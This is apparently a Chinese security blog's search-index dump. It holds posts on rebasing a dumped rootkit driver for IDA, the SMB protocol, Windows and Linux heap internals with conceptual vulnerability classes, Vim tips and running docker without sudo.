\u003e\u003e\u003e pe = pefile.PE('driver.89634000.sys') \u003e\u003e\u003e hex(pe.OPTIONAL_HEADER.ImageBase) '0x10000' \u003e\u003e\u003e pe.OPTIONAL_HEADER.ImageBase = 0x89634000 \u003e\u003e\u003e pe.write(filename='driver.89634000_mod.sys') OK，到此为止，转储出来的驱动程序应该就没有问题了，使用IDA打开看一下： 没有问题，现在就可以使用IDA进行深入的静态分析了。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:2:3","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":null,"content":"Hugo 主题 LoveIt \" ","date":"2019-08-02","objectID":"/about/:0:0","tags":null,"title":"关于 V4ler1an","uri":"/about/"},{"categories":null,"content":"我是谁  漏洞练习生：长期处于漏洞领域的学习和练习中，什么时候出道全看天  音乐忠实爱好者：属于没有音乐活不了的那种  看雪二进制漏洞版块小版主：何其有幸能为教会我许多的看雪论坛贡献自己的一份力量  羽毛球国家1亿级运动员：长期稳定占据该等级王者位置  MOBA游戏辅助迷：爱打辅助不是因为我菜，只是不想打击祖国电竞未来的希望  小区最强CTFer：常年霸占小区CTF竞赛排行榜第一名，从未下来过 ","date":"2019-08-02","objectID":"/about/:1:0","tags":null,"title":"关于 V4ler1an","uri":"/about/"},{"categories":null,"content":"And / 后续：博客后续应该会持续更新，频率不定 / 佛系：人生在世，淡然一点，所以什么都看得开 ","date":"2019-08-02","objectID":"/about/:2:0","tags":null,"title":"关于 V4ler1an","uri":"/about/"},{"categories":null,"content":"哪里找我  WeChat订阅号：技术文章更新速度没有Blog快，但是我家仙女会更新她的内容。 有毒的猫Alt text \" 有毒的猫  看雪主页: 看雪论坛–有毒  Twitter: Twitter主页基本什么都没有-。- ","date":"2019-08-02","objectID":"/about/:3:0","tags":null,"title":"关于 V4ler1an","uri":"/about/"},{"categories":null,"content":"最后就奉上我最喜欢的歌词 I’ve been reading books of old The legends and the myths Achilles and his gold Hercules and his gifts Spider-Man’s control And Batman with his fists And clearly I don’t see myself upon that list But she said, where’d you wanna go? How much you wanna risk? I’m not lookin' for somebody With some superhuman gifts Some superhero Some fairy-tale bliss Just something I can turn to Somebody I can kiss I want something just like this ","date":"2019-08-02","objectID":"/about/:4:0","tags":null,"title":"关于 V4ler1an","uri":"/about/"},{"categories":["Tech"],"content":"最近一直在研究SMB，由于其之前爆发过诸多漏洞，现将自己学到的知识简单做个整理总结。","date":"2019-05-30","objectID":"/2019/05/SMB/","tags":["SMB","Windows"],"title":"SMB协议简单总结","uri":"/2019/05/SMB/"},{"categories":["Tech"],"content":"SMB协议 ","date":"2019-05-30","objectID":"/2019/05/SMB/:1:0","tags":["SMB","Windows"],"title":"SMB协议简单总结","uri":"/2019/05/SMB/"},{"categories":["Tech"],"content":"一. Client和Server的连接过程 client和server首先建立NetBIOS session clent和server确定使用的smb协议的dialect（定义了特定协议版本的消息包集） client登录到server client连接server上的一个share client在share中打开文件 client开始读取文件 client和server首先要建立全双工的TCP连接，然后client建立并发送一个NetBIOS session请求包。 如果请求包格式化正确，server返回一个包含着确认session建立成功的消息包。然后，client 开始想server发送第一个smb协议数据包。 ","date":"2019-05-30","objectID":"/2019/05/SMB/:1:1","tags":["SMB","Windows"],"title":"SMB协议简单总结","uri":"/2019/05/SMB/"},{"categories":["Tech"],"content":"二. SMB协议涉及到的数据包分析 Packet1. SMB_COM_NEGOTIATE Direction:C-\u003eS\rDescription:client想server发送smb dialect的确认信息，server返回一个包含着dialects\r的字符串的数据包。\r Packet2. SMB_COM_NEGOTIATE Direction:S-\u003eC\rDescription:server相应client的请求，确定将在session中使用的smb dialect。server返回\r的数据包中还包括一个8字节的随机字符串，该字符串将在系一部中用于在登录过程中对客户端\r进行身份验证。\r Packet3. SMB_COM_SESSION_SETUP_ANDX Direction:C-\u003eS\rDescription:该数据包包含着有关client功能的信息，因此即使server实现了share-level\rsecurity model，也必须要发送该数据包。\r Packet4. SMB_COM_SESSION_SETUP_ANDX Direction:S-\u003eC\rDescription:如果server接受了challenge/response，则返回给client的数据包中将包含\r一个有效的UID。如果不接受，则在数据包中返回error code，并拒绝访问。\r Packet5. SMB_COM_TREE_CONNECT_ANDX Direction：C-\u003eS\rDescription:client对share发起访问，该数据包中包含UNC格式的绝对共享路径。\r Packet6. SMB_COM_TREE_CONNECT_ANDX Direction:S-\u003eC\rDescription:如果server授予了client访问权限，则server返回与该数据包中的share对应的\r16位的TID。如果share不存在或者client没有足够的权限，则server返回error code并拒绝访问。\r Packet7. SMB_COM_OPEN_ANDX Direction:C-\u003eS\rDescription:client请求server代表自己在share中打开文件，该数据包中包含要打开的文件的名称。\r Packet8. SMB_COM_OPEN_ANDX Direction:S-\u003eC\rDescription:如果授予了对文件的访问权限，则server返回请求文件的ID；如果文件不存在或者\r用户没有足够的权限访问该文件，则返回error code并拒绝client的访问。\r Packet9. SMB_COM_READ_ANDX Direction:C-\u003eS\rDescription:client请求server代替自己读取文件中的数据并返回给自己。打开文件时client\r获取的文件ID包含在该数据包中，以便识别server应该从哪个打开的文件中读取数据。\r Packet10. SMB_COM_READ_ANDX Direction:S-\u003eC\rDescription：server返回client请求的文件数据。由于已授予对server，share和文件的访问\r权限，一般不会出现问题。但是在某些特殊情况下会发生错误，例如在打开文件和从文件中读取数据\r这两步之间，对share的访问权限遭到了更改，就会发生错误。\r ","date":"2019-05-30","objectID":"/2019/05/SMB/:1:2","tags":["SMB","Windows"],"title":"SMB协议简单总结","uri":"/2019/05/SMB/"},{"categories":["Tech"],"content":"三. SMB Message结构 SMB Message包括一个固定长度的header（32字节）、一个可变长度的Parameter block（最大\r为64kb）、一个可变长度的Data block。\r The SMB Message Header 32字节的固定长度。\rSMB_Header\r{\rUCHAR Protocol[4];\rUCHAR Command;\rSMB_ERROR Status;\rUCHAR Flags;\rUSHORT Flags2;\rUSHORT PIDHigh;\rUCHAR SecurityFeatures[8];\rUSHORT Reserved;\rUSHORT TID;\rUSHORT PIDLow;\rUSHORT UID;\rUSHORT MID;\r}\r简单说一下比较重要的部分：\r Protocol:(4 字节)需要包含\"\\xff\",“S”,“M”,“B” Flags2:保留位必须设置为0，且需要重点关注SMB_FLAGS2_DFS字段，如果该位被设置为1，则任何的文件路径名都应该在DFS中进行处理（这也是很多漏洞触发点，因为对于文件路径规范化处理函数，有漏洞） SecuritySignature (8 bytes): 如果已协商SMB签名，则此字段必须包含一个8字节的加密消息签名，可用于检测消息是否在传输过程中被修改。 消息签名的使用与无连接传输是互斥的。 Parameter Block 在CIFS方言中，SMB_Parameters.Words数组可以包含任意结构。 SMB_Parameters.Words结构的格式是针对每个命令消息单独定义的。 Words数组的大小仍然被测量为字节对的计数。其结构如下所示： SMB_Parameters\r{\rUCHAR WordCount;\rUSHORT Words[WordCount] (variable);\r}\r Words (variable): The message-specific parameters structure. The size of this field MUST be (2 x WordCount) bytes. If WordCount is 0x00, this field is not included. Data Block 结构与Parameter Block相似：\rSMB_Data\r{\rUSHORT ByteCount;\rUCHAR Bytes[ByteCount] (variable);\r}\r Batched Message(AndX Messages) 主要是为了在一个message中发送多个request或者response command，而只需要一个smb header即可。\rIn AndX Messages, only one SMB Header (section 2.2.3.1) is sent. The header is then followed by zero or more Parameter and Data block pairs, each corresponding to an additional command request/response. There is no limit on the number of block pairs in a message specifically, only on the total message size. *The total size of a Batched Message MUST NOT exceed the negotiated MaxBufferSize.* AndX Messages contain a construct, conceptually similar to a linked-list, that is used to connect the batched block pairs. The resulting list is referred to as an AndX Chain.\r其结构如下：\rAndX\r{\rUCHAR AndXCommand;\rUCHAR AndXReserved;\rUSHORT AndXOffset;\r}\r AndXOffset (2 bytes): The offset in bytes, relative to the start of the SMB Header, of the next Parameter block in the AndX Message. This offset is independent of any other size parameters or offsets within the command. This offset can point to a location past the end of the current block pair. The AndX construct is located at the start of the Parameter block of an AndX command request/response. ","date":"2019-05-30","objectID":"/2019/05/SMB/:2:0","tags":["SMB","Windows"],"title":"SMB协议简单总结","uri":"/2019/05/SMB/"},{"categories":["Tech"],"content":"四. SMB COMMANDS 由于commands数量较多，此处给出微软官方的命令解释地址。\r[Microsoft Docs]: \u003chttps://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/5cd5747f-fe0b-40a6-89d0-d67f751f8232\u003e\r ​ ","date":"2019-05-30","objectID":"/2019/05/SMB/:3:0","tags":["SMB","Windows"],"title":"SMB协议简单总结","uri":"/2019/05/SMB/"},{"categories":["Tech"],"content":"Windows Heap是一个重要的内存区域，关于堆的漏洞屡见不鲜，特此总结学习。","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"在系统安全研究中，堆，是一个极其重要的内存区域以及研究的热点。堆，区别于栈区、全局数据区以及代码区，它的主要作用是允许程序在运行时动态地申请某个大小的内存空间。本文将从宏观到微观，简单梳理总结一下Windows系统中的堆相关的知识以及常见的堆利用漏洞，方便自己后续的学习。 Windows堆的历史 到目前为止，由于微软并没有完全公开Windows中堆管理的细节，所以现在对Windows下堆的了解都是基于技术爱好者、黑客、安全专家以及逆向工程师等的个人研究成果。这些前辈的努力工作，为我们留下了极其宝贵的研究资料。现在，我们已经可以基本清楚了部分Windows系统中的堆管理策略、与攻击相关的数据结构和算法等。此处，有几位技术精湛、贡献卓越的前辈值得我们铭记： Halvar Flake：2002年的Black Hat大会上，他在演讲“Third Generation Exploitation”中首次挑战Windows的堆溢出，并揭秘了堆中一些重要的数据结构和算法。 David Litchfield: David 在2004年的Black Hat上演讲的\"Windows Heap Overflows\"首次比较全面地介绍了Windows 2000平台下堆溢出地技术细节，包括重要数据结构、堆分配算法、利用思路、劫持进程地方法、执行shellcode时会遇到的问题等。 Matt Conover: 在其演讲的\"XP SP2 Heap Exploitation\"中全面揭示了Windows堆中与溢出相关的所有数据结构和分配策略，而且还提出了突破Windows XP SP2平台下诸多安全机制的防护进行堆溢出的方法。 Windows堆的数据结构与管理机制 堆不同于栈，其管理机制错综繁杂，操作系统一般会直接提供一套API来将底层的复杂的堆管理屏蔽掉。程序员在使用堆时可以只做三件事：申请一定大小的内存、使用内存、释放内存。 虽然对于程序员来说，对堆的操作变得简单，但是对于堆管理系统来说，需要有一套完善的机制来响应程序的内存使用申请，这意味着需要在“杂乱”的堆区中“寻找”到“合适”的、空闲的内存区域，以指针形式返回给程序。 “杂乱”：堆区在经过反复的申请、释放操作后，原本大片连续的空闲内存区域可能变得支离破碎，呈现出大小不等且空闲块、占用块相间隔的凌乱状态。 “寻找”：堆管理程序必须能够在“杂乱”的堆内存区域中找到程序申请的堆内存块，寻找过程中需要辨别哪些堆块是正在使用的，哪些堆块是已经释放的，处于空闲状态的。 “合适”：堆管理程序需要按需分配堆内存，不能过大也不能不够，需要“恰到好处”。 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:0:0","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"堆中的数据结构 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:1:0","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"堆块 传统内存统计单位往往是以字节位标准，但处于性能的考虑，堆内存按照大小不同组成不同的块，以堆块为单位进行标识。一个堆块包括两个部分：header部分和data部分。header是一个堆块头部的几个字节，用来标识这个堆块自身的信息。data是用来在最终分配给用户使用的数据区。\r ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:1:1","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"堆表 为了合理地组织堆区中的空闲堆块，提出了堆表的概念。堆表的数据结构决定了整个堆区的组织方式，一般位于堆区的起始位置，用于索引堆区中空闲堆块的重要信息，包括堆块的位置、大小、状态（空闲or占用）。\r下图是一个简单的堆内存组织图：\r 堆表并不索引所有的堆块。在Windows系统中，处于占用态的堆块由正在使用它的程序索引，处于空闲态的堆块由堆表索引。空闲的堆块大小不一，而且其使用频率不定。可能较小的堆块的使用频率更高，较大的使用频率较低，这需要对这两种情况进行不同的索引方式以提高效率。该问题主要通过不同类型的堆表进行解决，其中，最重要的堆表有两种：空闲双向链表Freelist和快速单向链表Lookaside。\r 1. 空闲双向链表Freelist 顾名思义，它是一个双向链表。在空闲堆块的header中有一对指针，用于将空闲堆块链接成双向链表。而且，在该双向链表中，根据堆块的大小不同，一共被分成了128条。 对于这128条链表的组织，由堆区一开始的堆表区中的一个有128项的指针数组索引，称为Freelist arrary。该数组的每一项都包含两个指针，用于标识一条空闲双向链表。其结构如下所示： 从上面空闲双向链表结构图中我们可以清晰地看到它的内部结构。第二项索引free[1]标识了堆区中所有大小为8字节的空闲堆块，第三项索引free[2]标识了堆区中所有大小为16字节的空闲堆块，之后的每各索引项标识堆区中的空闲堆块都逐次递增8字节，最后一个索引项free[127]标识的堆块的大小为1016字节。由以上数据，我们可以得到空闲堆块大小与索引项之间的对应关系： 空闲堆块大小 = 索引项 * 8 （单位：字节） 将不同大小的空闲堆块放入不同的空闲双向链表中就可以方便、高效地对堆区中不同大小的空闲堆块进行管理，也可以提高检索效率。 需要额外注意的是，上图中的第一个索引项free[0]，该链表索引的空闲堆块的大小不满足上面的公式，该索引项中链接的空闲堆块的大小都大于等于1024字节（小于512KB），这些空闲堆块按照升序在free[0]链表中依次排列。 2. 快速单向链表Lookaside 与Freelist不同，Lookaside是一个单向链表，这是Windows为了加速堆块分配而采用的一种堆表。Lookaside中的空闲堆块从来不会发生堆块合并（其中的空闲堆块header被设置为占用态，以防止堆块合并），因此可以大大提高堆块分配的速度。 Lookaside一共有128项，每一项索引的空闲堆块都以单链表的形式进行组织。其结构如下图所示： 此外，Lookaside还有一个特殊的特点，它总是被初始化为空，而且每条Lookaside最多只有4个节点。 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:1:2","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"堆中的堆块操作 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:2:0","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"1. 堆块分配 堆块的分配可以分为三类，Lookaside分配、普通Freelist分配以及0号Freelist（free[0]）分配。 Lookaside分配: 寻找到大小匹配的空闲堆块 -\u003e 修改状态为占用 -\u003e 从堆表中解链 -\u003e 给程序返回一个指向堆块的指针 普通Freelist分配： 寻找最优的空闲堆块 -\u003e 若失败，寻找次优空闲堆块分配 0号Freelist分配： 从free[0]反向寻找最后一个堆块（最大的堆块） -\u003e 若满足要求，再正向搜索最小的满足要求的空闲堆块 堆块分配中的“找零钱”现象： 当在Freelist中无法找到刚好合适的堆块时，此时会分配一个稍微大一点的空闲堆块给程序使用，其过程是首先在这个大块中分配出大小刚好等于请求堆块大小的堆块给程序，然后剩下的部分修改堆块的header信息，重新链入到Freelist合适的位置。这种方法节约了内存的使用，不会造成大量的内存浪费。 由于Lookaside只有在精确匹配时才会分配，因此不存在“找零钱”现象。 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:2:1","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"2. 堆块释放 堆块的释放主要是将堆块修改为空闲状态，然后将堆块链入相应的堆表。所有的释放块都链入堆表的末尾，分配的时候也会首先从堆表末尾分配。 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:2:2","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"3. 堆块合并 为了减少内存中的内存碎片，合理有效地利用内存，堆管理系统还需要进行堆块合并操作。当两个空闲堆块彼此相邻的时候就会进行堆块合并操作。其过程大致为： 将两个块从Freelist中解链 -\u003e 合并堆块 -\u003e 调整合并后堆块的header信息 -\u003e 将合并后的堆块放入Freelist合适的位置 Windows堆分配函数 Windows平台下的堆管理架构可以用下图来概述： 在Windows系统中，提供了许多类型的堆分配函数，大部分函数都可以在微软的官方文档中找到详细说明。各个函数之间调用关系如下图所示： 从上图中我们可以看到，虽然Windows中关于堆分配的函数有很多，但是各个函数最终都要使用RtlAllocateHeap()函数进行分配，该函数位于ntdll.dll文件中。或者可以换个角度看待这个问题，只要研究清楚了该函数，即可研究清楚Windows中的堆。 常见Windows堆漏洞类型 Windows平台下的堆管理机制与Linux平台下的堆管理机制虽然有不同的地方，但在漏洞利用方面，经常见到的漏洞类型大同小异，可能在漏洞利用的细节上不同。以下将简单介绍一下常见的堆漏洞类型以及比较经典的Windows堆漏洞。\r ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:2:3","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"1. 堆溢出漏洞 堆溢出与栈溢出在本质上是相通的，都是精心构造特制的数据去覆盖正常数据，覆盖到某个特定位置后跳转到自己的shellcode的地址去执行shellcode。但从技术层面来讲，堆溢出比栈溢出难度更大。而且现在基本很少有软件存在典型的栈溢出漏洞，相反由于堆的复杂性，很多软件仍然存在诸多的堆溢出漏洞。 堆溢出利用的核心是使用精心构造的数据去溢出下一个堆块的header部分，修改堆块中的两个指针：前向指针(flink)和后向指针(blink)，这样的操作会导致在堆块进行分配、合并、释放等操作时出现异常，攻击者可以在这三个操作的过程中寻找到向内存任意地址读写任意数据的机会，从而实现堆溢出攻击，在《0 day安全：软件漏洞分析技术》中，这种机会被称为\"DWORD SHOOT\"。 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:3:0","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"2. UAF漏洞 Use After Free（UAF），释放后重引用漏洞， 一块内存已经被释放后，在程序中仍然存在对该块内存的引用，并且在一定情况下可能使用内存中的数据。由于这块原本已经被释放不应该再使用的内存被程序中的其他地方进行了使用，因此该块内存中的数据是不可信的。这种方式甚至会造成内存崩溃或者任意代码执行。此类型的漏洞在浏览器中比较常见。 UAF漏洞比较有名的是CVE-2013-1347 Microsoft IE CGenericElement UAF漏洞，该漏洞被用在了当时著名的“水坑”事件中，影响巨大。 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:4:0","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tech"],"content":"3. Double Free漏洞 双重释放漏洞，主要是由于对同一块内存进行二次重复释放。在释放过程中，邻近的已释放的堆块存在合并动作，这会导致原有的堆header信息发生改变，同时前向指针和后向指针也会发生改变，随后再对其中的地址进行引用，就会导致访问异常，最终导致程序崩溃或者任意代码执行。从另外一个角度来说，由于发生了对释放后的堆块内存的引用，因此Double Free漏洞也是UAF漏洞的一个子集。 双重释放漏洞比较经典的是CVE-2014-1767，该漏洞位于Windows AFD.sys文件中。在2014年的Pwn2Own上，Siberas团队使用该漏洞进行内核提权，绕过了Windows 8.1平台上的IE11沙箱，并在随后获得了Pwnie Awards的“最佳提权漏洞奖”。该漏洞通杀Windows系统，影响较大。 参考文献 《0 day安全：软件漏洞分析技术》 《漏洞战争：软件分析精要》 ","date":"2019-05-29","objectID":"/2019/05/Windows-Heap/:5:0","tags":["Security","Widnows Heap"],"title":"Windows Heap 漫游","uri":"/2019/05/Windows-Heap/"},{"categories":["Tips"],"content":"Vim Tips and tricks","date":"2018-02-09","objectID":"/2018/02/09/vim-tips/","tags":["Tips","Vim"],"title":"Vim Tips","uri":"/2018/02/09/vim-tips/"},{"categories":["Tips"],"content":"vim graphical cheat sheet ","date":"2018-02-09","objectID":"/2018/02/09/vim-tips/:1:0","tags":["Tips","Vim"],"title":"Vim Tips","uri":"/2018/02/09/vim-tips/"},{"categories":["Tips"],"content":"Vim Jumps ^ — Move to start of line $ — Move to end of line b — Move back a word w — Move forward a word e — Move to the end of the next word Ctrl-o and Ctrl-i to go to the previous/next location you jumped to ``(two backticks) jump back to where you were gi go back to the last place you inserted a text and enter insert mode ","date":"2018-02-09","objectID":"/2018/02/09/vim-tips/:2:0","tags":["Tips","Vim"],"title":"Vim Tips","uri":"/2018/02/09/vim-tips/"},{"categories":["Tips"],"content":"Vim Navigations { and } jump paragraph back and forth Ctrl-F/B move one screen back and forth Search the word under cursor, then n/p to jump to next/previous ","date":"2018-02-09","objectID":"/2018/02/09/vim-tips/:3:0","tags":["Tips","Vim"],"title":"Vim Tips","uri":"/2018/02/09/vim-tips/"},{"categories":["Tips"],"content":"Enable Vim mode in bash vi ~/.inputrc set editing-mode vi ","date":"2018-02-09","objectID":"/2018/02/09/vim-tips/:4:0","tags":["Tips","Vim"],"title":"Vim Tips","uri":"/2018/02/09/vim-tips/"},{"categories":["Tips"],"content":"Enable system clipboard upport See if system clipboard is supported: $ vim --version | grep clipboard -clipboard +iconv +path_extra -toolbar +eval +mouse_dec +startuptime -xterm_clipboard Rinstall vim as vim-gnome: sudo apt-get install vim-gnome Select what you want using the mouse - then type to copy to clipboard: \"+y To paste to vim from clipboard type: \"+p ","date":"2018-02-09","objectID":"/2018/02/09/vim-tips/:5:0","tags":["Tips","Vim"],"title":"Vim Tips","uri":"/2018/02/09/vim-tips/"},{"categories":["Tips"],"content":"Others Ex: open the current directory set number: show line number ","date":"2018-02-09","objectID":"/2018/02/09/vim-tips/:6:0","tags":["Tips","Vim"],"title":"Vim Tips","uri":"/2018/02/09/vim-tips/"},{"categories":["Tips"],"content":"如何使用非root用户执行docker命令","date":"2018-02-09","objectID":"/2018/02/09/docker-without-sudo/","tags":["Tips","Docker"],"title":"如何使用非root用户执行docker命令","uri":"/2018/02/09/docker-without-sudo/"},{"categories":["Tips"],"content":"Add the docker group if it doesn’t already exist: sudo groupadd docker ","date":"2018-02-09","objectID":"/2018/02/09/docker-without-sudo/:0:1","tags":["Tips","Docker"],"title":"如何使用非root用户执行docker命令","uri":"/2018/02/09/docker-without-sudo/"},{"categories":["Tips"],"content":"Add the connected user “$USER” to the docker group. Change the user name to match your preferred user if you do not want to use your current user: sudo gpasswd -a $USER docker ","date":"2018-02-09","objectID":"/2018/02/09/docker-without-sudo/:0:2","tags":["Tips","Docker"],"title":"如何使用非root用户执行docker命令","uri":"/2018/02/09/docker-without-sudo/"},{"categories":["Tips"],"content":"Either do a newgrp docker or log out/in to activate the changes to groups. ","date":"2018-02-09","objectID":"/2018/02/09/docker-without-sudo/:0:3","tags":["Tips","Docker"],"title":"如何使用非root用户执行docker命令","uri":"/2018/02/09/docker-without-sudo/"},{"categories":null,"content":"Linux堆内存管理深入分析 ","date":"0001-01-01","objectID":"/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/:0:0","tags":null,"title":"","uri":"/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/"},{"categories":null,"content":"1. 堆概述 ","date":"0001-01-01","objectID":"/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/:1:0","tags":null,"title":"","uri":"/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/"},{"categories":null,"content":"1. 概念 程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，增长方向为由低到高。一般称管理堆的那部分程序为堆管理器。 堆管理器处于用户程序与内核中间，提供主要以下功能： 响应用户的申请内存请求，向OS申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法来管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与OS交互，申请新的内存。 管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给OS，而是由堆管理器进行管理。这些释放的内存在堆管理器的管理下，可以来响应用户新申请的内存的请求。 目前Linux发行版中使用的堆分配器是glibc中的堆分配器：ptmalloc2，其主要通过 malloc/free 函数来分配和释放内存块。 注：Linux 内存管理的一个基本思想：只有在真正访问一个地址的时候，OS才会建立虚拟页面与物理页面的映射关系。基于这个思想，OS虽然已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到响应的内存时，OS才会真正分配物理页面给用户使用。 ","date":"0001-01-01","objectID":"/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/:1:1","tags":null,"title":"","uri":"/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/"},{"categories":null,"content":"2. 堆的基本操作 堆分配：malloc 在 glibc 的 malloc.c 中，其说明如下： /* malloc(size_t n) Returns a pointer to a newly allocated chunk of at least n bytes, or null if no space is available. Additionally, on failure, errno is set to ENOMEM on ANSI C systems. If n is zero, malloc returns a minumum-sized chunk. (The minimum size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit systems.) On most systems, size_t is an unsigned type, so calls with negative arguments are interpreted as requests for huge amounts of space, which will often fail. The maximum supported value of n differs across systems, but is in all cases less than the maximum representable value of a size_t. */ malloc 函数返回的是对应大小字节的内存块的指针。 当n = 0时，返回当前系统允许的堆的最小内存块 当n为负数时，由于在大多数系统上，size_t 是无符号数（这一点非常重要），所以程序会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。 堆释放：free 在 glibc 的 malloc.c 中，其说明如下： /* free(void* p) Releases the chunk of memory pointed to by p, that had been previously allocated using malloc or a related routine such as realloc. It has no effect if p is null. It can have arbitrary (i.e., bad!) effects if p has already been freed. Unless disabled (using mallopt), freeing very large spaces will when possible, automatically trigger operations that give back unused memory to the system, thus reducing program footprint. */ free 函数会释放由指针 p 所指向的内存块。该内存块可能是 malloc f分配的，也可能是类似函数 realloc 等分配的。 当 p 为空指针时，函数不执行任何操作。 当 p 已经被释放后，再次释放会出现意料之外的效果，这其实就是 Double Free(双重释放)。 除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给OS，以便于减小程序所使用的内存空间。 内存分配涉及到的系统调用 无论是 malloc 还是 free，在动态申请和释放内存时，并不是真正与系统交互的函数。这些函数背后的系统调用主要是 (s)brk 函数以及 mmap, munmap 函数。 堆内存块申请 对于堆内存的分配操作，OS提供了 brk 函数，glibc 提供了 sbrk 函数，我们可以通过增加 brk 的大小来向OS申请内存。 初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同 不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。 开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。 具体效果如下图（这个图片与网上流传的基本一致，这里是因为要画一张大图，所以自己单独画了下）所示： 代码例子： /* sbrk and brk example */ #include \u003cstdio.h\u003e#include \u003cunistd.h\u003e#include \u003csys/types.h\u003e int main() { void *curr_brk, *tmp_brk = NULL; printf(\"Welcome to sbrk example:%d\\n\", getpid()); /* sbrk(0) gives current program break location */ tmp_brk = curr_brk = sbrk(0); printf(\"Program Break Location1:%p\\n\", curr_brk); getchar(); // 使用getchar来暂停运行，方便观察 /* brk(addr) increments/decrements program break location */ brk(curr_brk+4096); curr_brk = sbrk(0); printf(\"Program break Location2:%p\\n\", curr_brk); getchar(); brk(tmp_brk); curr_brk = sbrk(0); printf(\"Program Break Location3:%p\\n\", curr_brk); getchar(); return 0; } 在第一次调用brk之前 输出如下： ","date":"0001-01-01","objectID":"/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/:1:2","tags":null,"title":"","uri":"/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/"}]